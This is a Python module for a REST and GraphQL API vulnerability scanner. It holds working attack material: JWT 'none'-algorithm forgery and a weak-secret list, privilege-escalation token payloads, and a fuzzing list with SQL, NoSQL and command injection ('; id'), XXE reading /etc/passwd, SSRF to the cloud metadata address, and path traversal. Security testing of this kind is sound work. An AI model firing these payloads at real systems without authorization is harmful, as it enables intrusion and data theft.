#!/usr/bin/env python3
"""
Advanced API testing module for REST and GraphQL endpoints.
Provides comprehensive API security testing capabilities including authentication bypass,
parameter fuzzing, rate limiting detection, and vulnerability scanning.
"""

import json
import time
import requests
import urllib.parse
from typing import Dict, List, Optional, Any, Tuple, Set
from dataclasses import dataclass, field
from datetime import datetime, timedelta
from enum import Enum
import re
import base64
import jwt
import hashlib
from pathlib import Path

from .enhanced_logger import get_logger
from .error_handler import get_error_handler, handle_errors
from .simulation import get_simulation_engine


class APIType(Enum):
    """Types of APIs"""
    REST = "rest"
    GRAPHQL = "graphql"
    SOAP = "soap"
    GRPC = "grpc"
    WEBSOCKET = "websocket"


class HTTPMethod(Enum):
    """HTTP methods"""
    GET = "GET"
    POST = "POST"
    PUT = "PUT"
    PATCH = "PATCH"
    DELETE = "DELETE"
    HEAD = "HEAD"
    OPTIONS = "OPTIONS"
    TRACE = "TRACE"


class AuthType(Enum):
    """Authentication types"""
    NONE = "none"
    BASIC = "basic"
    BEARER = "bearer"
    API_KEY = "api_key"
    OAUTH2 = "oauth2"
    JWT = "jwt"
    CUSTOM = "custom"


class VulnerabilityType(Enum):
    """API vulnerability types"""
    AUTH_BYPASS = "authentication_bypass"
    IDOR = "insecure_direct_object_reference"
    INJECTION = "injection"
    XXE = "xml_external_entity"
    SSRF = "server_side_request_forgery"
    RATE_LIMIT = "missing_rate_limiting"
    CORS = "cors_misconfiguration"
    INFO_DISCLOSURE = "information_disclosure"
    BROKEN_ACCESS = "broken_access_control"
    BUSINESS_LOGIC = "business_logic_flaw"


@dataclass
class APIEndpoint:
    """API endpoint definition"""
    url: str
    method: HTTPMethod
    path: str
    parameters: Dict[str, Any] = field(default_factory=dict)
    headers: Dict[str, str] = field(default_factory=dict)
    body: Optional[Any] = None
    content_type: str = "application/json"
    auth_required: bool = False
    description: str = ""
    example_response: Optional[Dict[str, Any]] = None


@dataclass
class AuthConfig:
    """Authentication configuration"""
    auth_type: AuthType
    credentials: Dict[str, str] = field(default_factory=dict)
    token_endpoint: Optional[str] = None
    refresh_endpoint: Optional[str] = None
    current_token: Optional[str] = None
    token_expiry: Optional[datetime] = None


@dataclass
class FuzzingPayload:
    """Fuzzing payload definition"""
    name: str
    payload: str
    expected_behavior: str
    vulnerability_type: VulnerabilityType


@dataclass
class APITestResult:
    """API test result"""
    endpoint: APIEndpoint
    test_type: str
    status_code: int
    response_time: float
    headers: Dict[str, str]
    body: Any
    vulnerabilities: List[Dict[str, Any]] = field(default_factory=list)
    errors: List[str] = field(default_factory=list)
    timestamp: datetime = field(default_factory=datetime.now)


@dataclass
class RateLimitInfo:
    """Rate limiting information"""
    endpoint: str
    limit: Optional[int] = None
    window: Optional[int] = None  # seconds
    headers: Dict[str, str] = field(default_factory=dict)
    retry_after: Optional[int] = None


class APIAuthTester:
    """Test API authentication mechanisms"""
    
    def __init__(self):
        self.logger = get_logger()
        self.common_jwt_secrets = [
            "secret", "supersecret", "password", "123456", "admin",
            "jwt_secret", "your-256-bit-secret", "your-secret-key"
        ]
    
    @handle_errors
    def test_auth_bypass(self, endpoint: APIEndpoint, auth_config: AuthConfig) -> List[Dict[str, Any]]:
        """Test for authentication bypass vulnerabilities"""
        vulnerabilities = []
        
        # Test without authentication
        if auth_config.auth_type != AuthType.NONE:
            result = self._test_no_auth(endpoint)
            if result:
                vulnerabilities.append(result)
        
        # Test with manipulated tokens
        if auth_config.auth_type in [AuthType.BEARER, AuthType.JWT]:
            token_vulns = self._test_token_manipulation(endpoint, auth_config)
            vulnerabilities.extend(token_vulns)
        
        # Test method override
        method_result = self._test_method_override(endpoint, auth_config)
        if method_result:
            vulnerabilities.append(method_result)
        
        # Test header injection
        header_vulns = self._test_header_injection(endpoint, auth_config)
        vulnerabilities.extend(header_vulns)
        
        return vulnerabilities
    
    def _test_no_auth(self, endpoint: APIEndpoint) -> Optional[Dict[str, Any]]:
        """Test endpoint without authentication"""
        try:
            # Remove auth headers
            headers = {k: v for k, v in endpoint.headers.items() 
                      if k.lower() not in ['authorization', 'x-api-key', 'cookie']}
            
            response = requests.request(
                method=endpoint.method.value,
                url=endpoint.url + endpoint.path,
                headers=headers,
                json=endpoint.body if endpoint.content_type == "application/json" else None,
                data=endpoint.body if endpoint.content_type != "application/json" else None,
                timeout=10
            )
            
            if response.status_code < 400:
                return {
                    'type': VulnerabilityType.AUTH_BYPASS,
                    'severity': 'HIGH',
                    'description': 'Endpoint accessible without authentication',
                    'endpoint': endpoint.path,
                    'method': endpoint.method.value,
                    'status_code': response.status_code,
                    'evidence': {
                        'request_headers': headers,
                        'response_status': response.status_code,
                        'response_preview': response.text[:500]
                    }
                }
        except Exception as e:
            self.logger.debug(f"Error testing no auth: {e}")
        
        return None
    
    def _test_token_manipulation(self, endpoint: APIEndpoint, auth_config: AuthConfig) -> List[Dict[str, Any]]:
        """Test token manipulation vulnerabilities"""
        vulnerabilities = []
        
        if auth_config.auth_type == AuthType.JWT and auth_config.current_token:
            # Test JWT vulnerabilities
            jwt_vulns = self._test_jwt_vulnerabilities(endpoint, auth_config.current_token)
            vulnerabilities.extend(jwt_vulns)
        
        # Test expired token
        expired_result = self._test_expired_token(endpoint, auth_config)
        if expired_result:
            vulnerabilities.append(expired_result)
        
        # Test malformed token
        malformed_result = self._test_malformed_token(endpoint, auth_config)
        if malformed_result:
            vulnerabilities.append(malformed_result)
        
        return vulnerabilities
    
    def _test_jwt_vulnerabilities(self, endpoint: APIEndpoint, token: str) -> List[Dict[str, Any]]:
        """Test JWT-specific vulnerabilities"""
        vulnerabilities = []
        
        try:
            # Decode JWT without verification
            parts = token.split('.')
            if len(parts) != 3:
                return vulnerabilities
            
            header = json.loads(base64.urlsafe_b64decode(parts[0] + '=='))
            payload = json.loads(base64.urlsafe_b64decode(parts[1] + '=='))
            
            # Test algorithm confusion (None algorithm)
            none_token = self._create_jwt_none_algorithm(payload)
            none_result = self._test_modified_token(endpoint, none_token, "None algorithm")
            if none_result:
                vulnerabilities.append(none_result)
            
            # Test weak secrets
            for secret in self.common_jwt_secrets:
                weak_token = jwt.encode(payload, secret, algorithm='HS256')
                weak_result = self._test_modified_token(endpoint, weak_token, f"Weak secret: {secret}")
                if weak_result:
                    vulnerabilities.append(weak_result)
                    break
            
            # Test privilege escalation
            if 'role' in payload or 'admin' in payload or 'permissions' in payload:
                escalated_payload = payload.copy()
                escalated_payload['role'] = 'admin'
                escalated_payload['admin'] = True
                escalated_payload['permissions'] = ['*']
                
                # Try with discovered weak secret or none algorithm
                escalated_token = self._create_jwt_none_algorithm(escalated_payload)
                escalated_result = self._test_modified_token(endpoint, escalated_token, "Privilege escalation")
                if escalated_result:
                    vulnerabilities.append(escalated_result)
            
        except Exception as e:
            self.logger.debug(f"Error testing JWT: {e}")
        
        return vulnerabilities
    
    def _create_jwt_none_algorithm(self, payload: Dict[str, Any]) -> str:
        """Create JWT with None algorithm"""
        header = {"alg": "none", "typ": "JWT"}
        
        header_b64 = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip('=')
        payload_b64 = base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip('=')
        
        return f"{header_b64}.{payload_b64}."
    
    def _test_modified_token(self, endpoint: APIEndpoint, token: str, modification: str) -> Optional[Dict[str, Any]]:
        """Test endpoint with modified token"""
        try:
            headers = endpoint.headers.copy()
            headers['Authorization'] = f'Bearer {token}'
            
            response = requests.request(
                method=endpoint.method.value,
                url=endpoint.url + endpoint.path,
                headers=headers,
                json=endpoint.body if endpoint.content_type == "application/json" else None,
                timeout=10
            )
            
            if response.status_code < 400:
                return {
                    'type': VulnerabilityType.AUTH_BYPASS,
                    'severity': 'CRITICAL',
                    'description': f'JWT vulnerability - {modification}',
                    'endpoint': endpoint.path,
                    'method': endpoint.method.value,
                    'evidence': {
                        'modification': modification,
                        'modified_token': token[:50] + '...',
                        'response_status': response.status_code
                    }
                }
        except Exception as e:
            self.logger.debug(f"Error testing modified token: {e}")
        
        return None
    
    def _test_expired_token(self, endpoint: APIEndpoint, auth_config: AuthConfig) -> Optional[Dict[str, Any]]:
        """Test with expired token"""
        # Implementation depends on token type
        # For now, return None
        return None
    
    def _test_malformed_token(self, endpoint: APIEndpoint, auth_config: AuthConfig) -> Optional[Dict[str, Any]]:
        """Test with malformed token"""
        try:
            headers = endpoint.headers.copy()
            headers['Authorization'] = 'Bearer malformed.token.here'
            
            response = requests.request(
                method=endpoint.method.value,
                url=endpoint.url + endpoint.path,
                headers=headers,
                json=endpoint.body if endpoint.content_type == "application/json" else None,
                timeout=10
            )
            
            # Check for information disclosure in error messages
            if response.status_code >= 400 and response.text:
                sensitive_patterns = [
                    r'stack trace',
                    r'file.*\.py.*line',
                    r'SQLException',
                    r'ORA-\d+',
                    r'PG::',
                    r'MongoDB',
                    r'mysql_',
                    r'Warning:.*in.*on line'
                ]
                
                for pattern in sensitive_patterns:
                    if re.search(pattern, response.text, re.IGNORECASE):
                        return {
                            'type': VulnerabilityType.INFO_DISCLOSURE,
                            'severity': 'MEDIUM',
                            'description': 'Sensitive information in error response',
                            'endpoint': endpoint.path,
                            'method': endpoint.method.value,
                            'evidence': {
                                'error_pattern': pattern,
                                'response_preview': response.text[:500]
                            }
                        }
        except Exception as e:
            self.logger.debug(f"Error testing malformed token: {e}")
        
        return None
    
    def _test_method_override(self, endpoint: APIEndpoint, auth_config: AuthConfig) -> Optional[Dict[str, Any]]:
        """Test HTTP method override"""
        if endpoint.method == HTTPMethod.GET:
            return None
        
        try:
            # Try method override headers
            override_headers = [
                ('X-HTTP-Method-Override', 'GET'),
                ('X-HTTP-Method', 'GET'),
                ('X-Method-Override', 'GET'),
                ('_method', 'GET')
            ]
            
            for header_name, header_value in override_headers:
                headers = endpoint.headers.copy()
                headers[header_name] = header_value
                
                response = requests.request(
                    method='POST',  # Use POST but try to override to GET
                    url=endpoint.url + endpoint.path,
                    headers=headers,
                    json=endpoint.body if endpoint.content_type == "application/json" else None,
                    timeout=10
                )
                
                if response.status_code < 400:
                    return {
                        'type': VulnerabilityType.AUTH_BYPASS,
                        'severity': 'HIGH',
                        'description': 'HTTP method override vulnerability',
                        'endpoint': endpoint.path,
                        'method': endpoint.method.value,
                        'evidence': {
                            'override_header': header_name,
                            'override_value': header_value,
                            'response_status': response.status_code
                        }
                    }
        except Exception as e:
            self.logger.debug(f"Error testing method override: {e}")
        
        return None
    
    def _test_header_injection(self, endpoint: APIEndpoint, auth_config: AuthConfig) -> List[Dict[str, Any]]:
        """Test header injection vulnerabilities"""
        vulnerabilities = []
        
        # Test X-Forwarded-For bypass
        xff_headers = [
            {'X-Forwarded-For': '127.0.0.1'},
            {'X-Forwarded-For': '10.0.0.1'},
            {'X-Forwarded-For': 'localhost'},
            {'X-Real-IP': '127.0.0.1'},
            {'X-Originating-IP': '127.0.0.1'}
        ]
        
        for header_set in xff_headers:
            try:
                headers = endpoint.headers.copy()
                headers.update(header_set)
                
                response = requests.request(
                    method=endpoint.method.value,
                    url=endpoint.url + endpoint.path,
                    headers=headers,
                    json=endpoint.body if endpoint.content_type == "application/json" else None,
                    timeout=10
                )
                
                if response.status_code < 400 and endpoint.auth_required:
                    vulnerabilities.append({
                        'type': VulnerabilityType.AUTH_BYPASS,
                        'severity': 'HIGH',
                        'description': 'IP-based access control bypass',
                        'endpoint': endpoint.path,
                        'method': endpoint.method.value,
                        'evidence': {
                            'bypass_headers': header_set,
                            'response_status': response.status_code
                        }
                    })
                    break
            except Exception as e:
                self.logger.debug(f"Error testing header injection: {e}")
        
        return vulnerabilities


class APIFuzzer:
    """Fuzz API parameters for vulnerabilities"""
    
    def __init__(self):
        self.logger = get_logger()
        self.payloads = self._load_fuzzing_payloads()
    
    def _load_fuzzing_payloads(self) -> List[FuzzingPayload]:
        """Load fuzzing payloads"""
        payloads = [
            # SQL Injection
            FuzzingPayload(
                name="SQL Injection - Single Quote",
                payload="'",
                expected_behavior="SQL error or different response",
                vulnerability_type=VulnerabilityType.INJECTION
            ),
            FuzzingPayload(
                name="SQL Injection - OR 1=1",
                payload="' OR '1'='1",
                expected_behavior="Bypass or data disclosure",
                vulnerability_type=VulnerabilityType.INJECTION
            ),
            FuzzingPayload(
                name="SQL Injection - Union",
                payload="' UNION SELECT 1,2,3--",
                expected_behavior="SQL error or data disclosure",
                vulnerability_type=VulnerabilityType.INJECTION
            ),
            FuzzingPayload(
                name="SQL Injection - Time-based",
                payload="'; WAITFOR DELAY '00:00:05'--",
                expected_behavior="5 second delay",
                vulnerability_type=VulnerabilityType.INJECTION
            ),
            
            # NoSQL Injection
            FuzzingPayload(
                name="NoSQL Injection - MongoDB",
                payload='{"$ne": null}',
                expected_behavior="Bypass or data disclosure",
                vulnerability_type=VulnerabilityType.INJECTION
            ),
            FuzzingPayload(
                name="NoSQL Injection - MongoDB $where",
                payload='{"$where": "sleep(5000)"}',
                expected_behavior="5 second delay",
                vulnerability_type=VulnerabilityType.INJECTION
            ),
            
            # Command Injection
            FuzzingPayload(
                name="Command Injection - Semicolon",
                payload="; id",
                expected_behavior="Command output in response",
                vulnerability_type=VulnerabilityType.INJECTION
            ),
            FuzzingPayload(
                name="Command Injection - Pipe",
                payload="| id",
                expected_behavior="Command output in response",
                vulnerability_type=VulnerabilityType.INJECTION
            ),
            FuzzingPayload(
                name="Command Injection - Backticks",
                payload="`id`",
                expected_behavior="Command output in response",
                vulnerability_type=VulnerabilityType.INJECTION
            ),
            
            # XXE
            FuzzingPayload(
                name="XXE - External Entity",
                payload='<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>',
                expected_behavior="File content in response",
                vulnerability_type=VulnerabilityType.XXE
            ),
            
            # SSRF
            FuzzingPayload(
                name="SSRF - Localhost",
                payload="http://localhost:8080",
                expected_behavior="Internal service response",
                vulnerability_type=VulnerabilityType.SSRF
            ),
            FuzzingPayload(
                name="SSRF - Internal IP",
                payload="http://169.254.169.254/latest/meta-data/",
                expected_behavior="AWS metadata response",
                vulnerability_type=VulnerabilityType.SSRF
            ),
            
            # Path Traversal
            FuzzingPayload(
                name="Path Traversal - Basic",
                payload="../../../etc/passwd",
                expected_behavior="File content in response",
                vulnerability_type=VulnerabilityType.INJECTION
            ),
            FuzzingPayload(
                name="Path Traversal - URL Encoded",
                payload="%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
                expected_behavior="File content in response",
                vulnerability_type=VulnerabilityType.INJECTION
            ),
            
            # IDOR
            FuzzingPayload(
                name="IDOR - Sequential ID",
                payload="1",
                expected_behavior="Access to other user's data",
                vulnerability_type=VulnerabilityType.IDOR
            ),
            FuzzingPayload(
                name="IDOR - UUID Pattern",
                payload="00000000-0000-0000-0000-000000000001",
                expected_behavior="Access to other user's data",
                vulnerability_type=VulnerabilityType.IDOR
            )
        ]
        
        return payloads
    
    @handle_errors
    def fuzz_parameters(self, endpoint: APIEndpoint, auth_config: Optional[AuthConfig] = None) -> List[Dict[str, Any]]:
        """Fuzz all parameters in the endpoint"""
        vulnerabilities = []
        
        # Fuzz URL parameters
        if endpoint.parameters:
            param_vulns = self._fuzz_url_parameters(endpoint, auth_config)
            vulnerabilities.extend(param_vulns)
        
        # Fuzz body parameters
        if endpoint.body and endpoint.method in [HTTPMethod.POST, HTTPMethod.PUT, HTTPMethod.PATCH]:
            body_vulns = self._fuzz_body_parameters(endpoint, auth_config)
            vulnerabilities.extend(body_vulns)
        
        # Fuzz headers
        header_vulns = self._fuzz_headers(endpoint, auth_config)
        vulnerabilities.extend(header_vulns)
        
        return vulnerabilities
    
    def _fuzz_url_parameters(self, endpoint: APIEndpoint, auth_config: Optional[AuthConfig]) -> List[Dict[str, Any]]:
        """Fuzz URL parameters"""
        vulnerabilities = []
        
        for param_name, original_value in endpoint.parameters.items():
            for payload in self.payloads:
                try:
                    # Create fuzzed parameters
                    fuzzed_params = endpoint.parameters.copy()
                    fuzzed_params[param_name] = payload.payload
                    
                    # Build URL with parameters
                    url = endpoint.url + endpoint.path
                    if fuzzed_params:
                        url += '?' + urllib.parse.urlencode(fuzzed_params)
                    
                    # Send request
                    start_time = time.time()
                    response = requests.request(
                        method=endpoint.method.value,
                        url=url,
                        headers=endpoint.headers,
                        timeout=10
                    )
                    response_time = time.time() - start_time
                    
                    # Check for vulnerabilities
                    vuln = self._check_response_for_vulnerability(
                        response, response_time, payload, param_name, endpoint
                    )
                    if vuln:
                        vulnerabilities.append(vuln)
                    
                except Exception as e:
                    self.logger.debug(f"Error fuzzing parameter {param_name}: {e}")
        
        return vulnerabilities
    
    def _fuzz_body_parameters(self, endpoint: APIEndpoint, auth_config: Optional[AuthConfig]) -> List[Dict[str, Any]]:
        """Fuzz body parameters"""
        vulnerabilities = []
        
        if not isinstance(endpoint.body, dict):
            return vulnerabilities
        
        def fuzz_nested_dict(obj: Any, path: str = "") -> List[Dict[str, Any]]:
            """Recursively fuzz nested dictionary"""
            vulns = []
            
            if isinstance(obj, dict):
                for key, value in obj.items():
                    current_path = f"{path}.{key}" if path else key
                    
                    # Fuzz this value
                    for payload in self.payloads:
                        try:
                            # Deep copy and modify
                            import copy
                            fuzzed_body = copy.deepcopy(endpoint.body)
                            
                            # Navigate to the nested value and replace it
                            target = fuzzed_body
                            path_parts = current_path.split('.')
                            for part in path_parts[:-1]:
                                target = target[part]
                            target[path_parts[-1]] = payload.payload
                            
                            # Send request
                            start_time = time.time()
                            response = requests.request(
                                method=endpoint.method.value,
                                url=endpoint.url + endpoint.path,
                                headers=endpoint.headers,
                                json=fuzzed_body,
                                timeout=10
                            )
                            response_time = time.time() - start_time
                            
                            # Check for vulnerabilities
                            vuln = self._check_response_for_vulnerability(
                                response, response_time, payload, current_path, endpoint
                            )
                            if vuln:
                                vulns.append(vuln)
                            
                        except Exception as e:
                            self.logger.debug(f"Error fuzzing body parameter {current_path}: {e}")
                    
                    # Recurse into nested objects
                    if isinstance(value, dict):
                        nested_vulns = fuzz_nested_dict(value, current_path)
                        vulns.extend(nested_vulns)
            
            return vulns
        
        vulnerabilities = fuzz_nested_dict(endpoint.body)
        return vulnerabilities
    
    def _fuzz_headers(self, endpoint: APIEndpoint, auth_config: Optional[AuthConfig]) -> List[Dict[str, Any]]:
        """Fuzz HTTP headers"""
        vulnerabilities = []
        
        # Common headers to fuzz
        fuzz_headers = [
            'User-Agent', 'Referer', 'X-Forwarded-For', 'X-Real-IP',
            'X-Forwarded-Host', 'X-Original-URL', 'X-Rewrite-URL'
        ]
        
        for header_name in fuzz_headers:
            for payload in self.payloads:
                try:
                    # Create fuzzed headers
                    fuzzed_headers = endpoint.headers.copy()
                    fuzzed_headers[header_name] = payload.payload
                    
                    # Send request
                    start_time = time.time()
                    response = requests.request(
                        method=endpoint.method.value,
                        url=endpoint.url + endpoint.path,
                        headers=fuzzed_headers,
                        json=endpoint.body if endpoint.content_type == "application/json" else None,
                        params=endpoint.parameters,
                        timeout=10
                    )
                    response_time = time.time() - start_time
                    
                    # Check for vulnerabilities
                    vuln = self._check_response_for_vulnerability(
                        response, response_time, payload, f"Header: {header_name}", endpoint
                    )
                    if vuln:
                        vulnerabilities.append(vuln)
                    
                except Exception as e:
                    self.logger.debug(f"Error fuzzing header {header_name}: {e}")
        
        return vulnerabilities
    
    def _check_response_for_vulnerability(self, response: requests.Response, response_time: float,
                                         payload: FuzzingPayload, parameter: str, 
                                         endpoint: APIEndpoint) -> Optional[Dict[str, Any]]:
        """Check response for signs of vulnerability"""
        vulnerability = None
        
        # Check for SQL injection
        if payload.vulnerability_type == VulnerabilityType.INJECTION:
            sql_errors = [
                "SQL syntax", "mysql_fetch", "ORA-[0-9]+", "PostgreSQL.*ERROR",
                "warning.*mysql", "valid MySQL result", "mssql_query()",
                "Unclosed quotation mark", "PostgreSQL query failed",
                "syntax error", "fatal error", "SQLSTATE"
            ]
            
            for error in sql_errors:
                if re.search(error, response.text, re.IGNORECASE):
                    vulnerability = {
                        'type': VulnerabilityType.INJECTION,
                        'severity': 'HIGH',
                        'description': f'SQL Injection in {parameter}',
                        'endpoint': endpoint.path,
                        'method': endpoint.method.value,
                        'parameter': parameter,
                        'evidence': {
                            'payload': payload.payload,
                            'error_pattern': error,
                            'response_preview': response.text[:500]
                        }
                    }
                    break
            
            # Time-based detection
            if 'WAITFOR' in payload.payload or 'sleep' in payload.payload.lower():
                if response_time > 4.5:  # Expecting 5 second delay
                    vulnerability = {
                        'type': VulnerabilityType.INJECTION,
                        'severity': 'HIGH',
                        'description': f'Time-based SQL Injection in {parameter}',
                        'endpoint': endpoint.path,
                        'method': endpoint.method.value,
                        'parameter': parameter,
                        'evidence': {
                            'payload': payload.payload,
                            'response_time': response_time,
                            'expected_delay': 5
                        }
                    }
        
        # Check for XXE
        elif payload.vulnerability_type == VulnerabilityType.XXE:
            if any(indicator in response.text for indicator in ['root:', 'bin:', '/etc/passwd']):
                vulnerability = {
                    'type': VulnerabilityType.XXE,
                    'severity': 'HIGH',
                    'description': f'XML External Entity (XXE) in {parameter}',
                    'endpoint': endpoint.path,
                    'method': endpoint.method.value,
                    'parameter': parameter,
                    'evidence': {
                        'payload': payload.payload,
                        'file_content_found': True,
                        'response_preview': response.text[:500]
                    }
                }
        
        # Check for SSRF
        elif payload.vulnerability_type == VulnerabilityType.SSRF:
            # Look for signs of internal service response
            ssrf_indicators = [
                'metadata', 'ami-id', 'instance-id',  # AWS metadata
                'localhost', '127.0.0.1',  # Local services
                'internal', 'private'  # Internal network indicators
            ]
            
            for indicator in ssrf_indicators:
                if indicator in response.text.lower():
                    vulnerability = {
                        'type': VulnerabilityType.SSRF,
                        'severity': 'HIGH',
                        'description': f'Server-Side Request Forgery (SSRF) in {parameter}',
                        'endpoint': endpoint.path,
                        'method': endpoint.method.value,
                        'parameter': parameter,
                        'evidence': {
                            'payload': payload.payload,
                            'indicator_found': indicator,
                            'response_preview': response.text[:500]
                        }
                    }
                    break
        
        # Check for command injection
        if 'id' in payload.payload or 'whoami' in payload.payload:
            command_outputs = [
                r'uid=\d+.*gid=\d+',  # Unix id command
                r'[a-zA-Z]+\\[a-zA-Z]+',  # Windows domain\user
                'root', 'www-data', 'apache'  # Common users
            ]
            
            for pattern in command_outputs:
                if re.search(pattern, response.text):
                    vulnerability = {
                        'type': VulnerabilityType.INJECTION,
                        'severity': 'CRITICAL',
                        'description': f'Command Injection in {parameter}',
                        'endpoint': endpoint.path,
                        'method': endpoint.method.value,
                        'parameter': parameter,
                        'evidence': {
                            'payload': payload.payload,
                            'command_output_pattern': pattern,
                            'response_preview': response.text[:500]
                        }
                    }
                    break
        
        # Check for path traversal
        if '../' in payload.payload or '%2e%2e' in payload.payload:
            if any(indicator in response.text for indicator in ['root:', '/bin/bash', '[boot loader]']):
                vulnerability = {
                    'type': VulnerabilityType.INJECTION,
                    'severity': 'HIGH',
                    'description': f'Path Traversal in {parameter}',
                    'endpoint': endpoint.path,
                    'method': endpoint.method.value,
                    'parameter': parameter,
                    'evidence': {
                        'payload': payload.payload,
                        'file_content_found': True,
                        'response_preview': response.text[:500]
                    }
                }
        
        return vulnerability


class GraphQLTester:
    """Test GraphQL-specific vulnerabilities"""
    
    def __init__(self):
        self.logger = get_logger()
    
    @handle_errors
    def test_introspection(self, endpoint: str, headers: Dict[str, str] = None) -> Optional[Dict[str, Any]]:
        """Test if GraphQL introspection is enabled"""
        introspection_query = {
            "query": """
                query IntrospectionQuery {
                    __schema {
                        queryType { name }
                        mutationType { name }
                        types {
                            ...FullType
                        }
                    }
                }
                
                fragment FullType on __Type {
                    kind
                    name
                    description
                    fields(includeDeprecated: true) {
                        name
                        description
                        args {
                            ...InputValue
                        }
                        type {
                            ...TypeRef
                        }
                        isDeprecated
                        deprecationReason
                    }
                }
                
                fragment InputValue on __InputValue {
                    name
                    description
                    type { ...TypeRef }
                    defaultValue
                }
                
                fragment TypeRef on __Type {
                    kind
                    name
                    ofType {
                        kind
                        name
                    }
                }
            """
        }
        
        try:
            response = requests.post(
                endpoint,
                json=introspection_query,
                headers=headers or {},
                timeout=10
            )
            
            if response.status_code == 200 and '__schema' in response.json().get('data', {}):
                schema_data = response.json()['data']['__schema']
                
                return {
                    'type': VulnerabilityType.INFO_DISCLOSURE,
                    'severity': 'MEDIUM',
                    'description': 'GraphQL introspection is enabled',
                    'endpoint': endpoint,
                    'evidence': {
                        'query_type': schema_data.get('queryType', {}).get('name'),
                        'mutation_type': schema_data.get('mutationType', {}).get('name'),
                        'types_count': len(schema_data.get('types', [])),
                        'recommendation': 'Disable introspection in production'
                    }
                }
        except Exception as e:
            self.logger.debug(f"Error testing introspection: {e}")
        
        return None
    
    @handle_errors
    def test_query_depth_limit(self, endpoint: str, headers: Dict[str, str] = None) -> Optional[Dict[str, Any]]:
        """Test for query depth limit"""
        # Create deeply nested query
        depth = 15
        query = "query { "
        for i in range(depth):
            query += f"alias{i}: __typename "
        query += "}"
        
        try:
            response = requests.post(
                endpoint,
                json={"query": query},
                headers=headers or {},
                timeout=10
            )
            
            if response.status_code == 200:
                return {
                    'type': VulnerabilityType.RATE_LIMIT,
                    'severity': 'MEDIUM',
                    'description': 'No query depth limit detected',
                    'endpoint': endpoint,
                    'evidence': {
                        'tested_depth': depth,
                        'response_status': response.status_code,
                        'recommendation': 'Implement query depth limiting'
                    }
                }
        except Exception as e:
            self.logger.debug(f"Error testing query depth: {e}")
        
        return None
    
    @handle_errors
    def test_batching_attack(self, endpoint: str, headers: Dict[str, str] = None) -> Optional[Dict[str, Any]]:
        """Test for batching attack vulnerability"""
        # Create batch query
        batch_query = []
        for i in range(10):
            batch_query.append({
                "query": "query { __typename }"
            })
        
        try:
            response = requests.post(
                endpoint,
                json=batch_query,
                headers=headers or {},
                timeout=10
            )
            
            if response.status_code == 200 and isinstance(response.json(), list):
                return {
                    'type': VulnerabilityType.RATE_LIMIT,
                    'severity': 'MEDIUM',
                    'description': 'GraphQL batching attack possible',
                    'endpoint': endpoint,
                    'evidence': {
                        'batch_size': len(batch_query),
                        'response_count': len(response.json()),
                        'recommendation': 'Implement query cost analysis and rate limiting'
                    }
                }
        except Exception as e:
            self.logger.debug(f"Error testing batching: {e}")
        
        return None
    
    @handle_errors
    def test_field_suggestions(self, endpoint: str, headers: Dict[str, str] = None) -> Optional[Dict[str, Any]]:
        """Test if field suggestions reveal schema information"""
        # Query with intentional typo
        query = {
            "query": "{ userz { id } }"  # 'userz' instead of 'users'
        }
        
        try:
            response = requests.post(
                endpoint,
                json=query,
                headers=headers or {},
                timeout=10
            )
            
            if response.status_code == 400:
                error_message = str(response.json())
                
                # Check for field suggestions
                if 'Did you mean' in error_message or 'users' in error_message:
                    return {
                        'type': VulnerabilityType.INFO_DISCLOSURE,
                        'severity': 'LOW',
                        'description': 'GraphQL field suggestions reveal schema information',
                        'endpoint': endpoint,
                        'evidence': {
                            'error_reveals_fields': True,
                            'error_preview': error_message[:200],
                            'recommendation': 'Disable field suggestions in production'
                        }
                    }
        except Exception as e:
            self.logger.debug(f"Error testing field suggestions: {e}")
        
        return None


class RateLimitTester:
    """Test API rate limiting"""
    
    def __init__(self):
        self.logger = get_logger()
    
    @handle_errors
    def test_rate_limits(self, endpoint: APIEndpoint, auth_config: Optional[AuthConfig] = None,
                        requests_count: int = 100) -> Dict[str, Any]:
        """Test endpoint rate limits"""
        results = {
            'has_rate_limit': False,
            'limit': None,
            'window': None,
            'headers': {},
            'vulnerability': None
        }
        
        successful_requests = 0
        rate_limited = False
        rate_limit_headers = {}
        
        # Send rapid requests
        start_time = time.time()
        
        for i in range(requests_count):
            try:
                response = requests.request(
                    method=endpoint.method.value,
                    url=endpoint.url + endpoint.path,
                    headers=endpoint.headers,
                    json=endpoint.body if endpoint.content_type == "application/json" else None,
                    params=endpoint.parameters,
                    timeout=5
                )
                
                # Check for rate limit headers
                for header in ['X-RateLimit-Limit', 'X-RateLimit-Remaining', 'X-RateLimit-Reset',
                             'RateLimit-Limit', 'RateLimit-Remaining', 'RateLimit-Reset',
                             'X-Rate-Limit-Limit', 'X-Rate-Limit-Remaining', 'X-Rate-Limit-Reset']:
                    if header in response.headers:
                        rate_limit_headers[header] = response.headers[header]
                
                if response.status_code == 429:
                    rate_limited = True
                    results['has_rate_limit'] = True
                    
                    # Get retry-after if available
                    if 'Retry-After' in response.headers:
                        results['retry_after'] = int(response.headers['Retry-After'])
                    
                    break
                elif response.status_code < 400:
                    successful_requests += 1
                
                # Small delay to avoid overwhelming the server
                time.sleep(0.1)
                
            except Exception as e:
                self.logger.debug(f"Error in rate limit test: {e}")
        
        elapsed_time = time.time() - start_time
        
        # Analyze results
        results['headers'] = rate_limit_headers
        results['successful_requests'] = successful_requests
        results['elapsed_time'] = elapsed_time
        
        # Extract rate limit info from headers
        if 'X-RateLimit-Limit' in rate_limit_headers:
            results['limit'] = int(rate_limit_headers['X-RateLimit-Limit'])
        
        # Check for vulnerability
        if not rate_limited and successful_requests >= 50:
            results['vulnerability'] = {
                'type': VulnerabilityType.RATE_LIMIT,
                'severity': 'MEDIUM',
                'description': 'No rate limiting detected',
                'endpoint': endpoint.path,
                'method': endpoint.method.value,
                'evidence': {
                    'requests_sent': successful_requests,
                    'time_elapsed': elapsed_time,
                    'requests_per_second': successful_requests / elapsed_time,
                    'recommendation': 'Implement rate limiting to prevent abuse'
                }
            }
        
        return results


class APITester:
    """Main API testing orchestrator"""
    
    def __init__(self, base_url: str, api_type: APIType = APIType.REST):
        self.base_url = base_url.rstrip('/')
        self.api_type = api_type
        self.logger = get_logger()
        self.simulation = get_simulation_engine()
        
        # Initialize testers
        self.auth_tester = APIAuthTester()
        self.fuzzer = APIFuzzer()
        self.graphql_tester = GraphQLTester() if api_type == APIType.GRAPHQL else None
